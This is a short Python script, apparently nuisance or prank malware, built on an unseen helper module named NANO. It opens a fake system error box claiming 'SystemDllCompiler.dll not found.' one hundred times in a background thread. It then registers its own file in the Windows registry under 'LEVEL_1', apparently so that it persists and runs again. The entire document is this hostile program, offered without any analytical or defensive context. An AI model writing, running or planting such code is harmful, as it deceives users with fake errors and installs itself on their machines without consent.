import NANO
from threading import Thread


def infinity_msgbox():
    
    for i in range(100):
        NANO.msgbox("SystemDLL:",'SystemDllCompiler.dll not found.',16)
        




if __name__ == "__main__": 
    Thread(target=infinity_msgbox,args=tuple()).start()
    NANO.AddToRegistry('LEVEL_1',__file__)